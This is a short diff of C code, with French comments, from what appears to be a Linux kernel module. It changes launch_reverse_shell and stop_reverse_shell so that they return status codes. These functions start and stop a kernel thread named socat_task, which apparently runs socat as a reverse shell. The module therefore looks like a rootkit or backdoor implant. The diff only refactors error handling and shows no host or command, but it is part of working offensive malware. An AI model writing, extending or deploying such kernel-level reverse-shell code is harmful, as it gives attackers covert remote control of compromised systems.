@@ -93,8 +93,7 @@ static int socat_task_fn(void *data) {
     return 0;
 }
 
-void launch_reverse_shell(void)
-{
+int launch_reverse_shell(void){
     // Initialisation de la structure de synchronisation
     init_completion(&socat_completion);
 
@@ -102,20 +101,24 @@ void launch_reverse_shell(void)
     socat_task = kthread_run(socat_task_fn, NULL, "socat_task");
     if (IS_ERR(socat_task)) {
         ERR_MSG("launch_reverse_shell: failed to create socat task: %ld\n", PTR_ERR(socat_task));
+		return -FAILURE;
     } else {
         DBG_MSG("launch_reverse_shell: socat task started\n");
     }
+
+	return SUCCESS;
 }
 
 // Fonction pour arrêter socat et nettoyer les ressources
-void stop_reverse_shell(void)
-{
+int stop_reverse_shell(void){
     if (socat_task) {
         DBG_MSG("stop_reverse_shell: stopping socat task\n");
         complete(&socat_completion);  // Terminer `socat`
         kthread_stop(socat_task);  // Arrêter le thread de socat
         socat_task = NULL;
-    }else
+    }else{
 		DBG_MSG("stop_reverse_shell: socat task is not running\n");
+	}
 
+	return SUCCESS;
 }
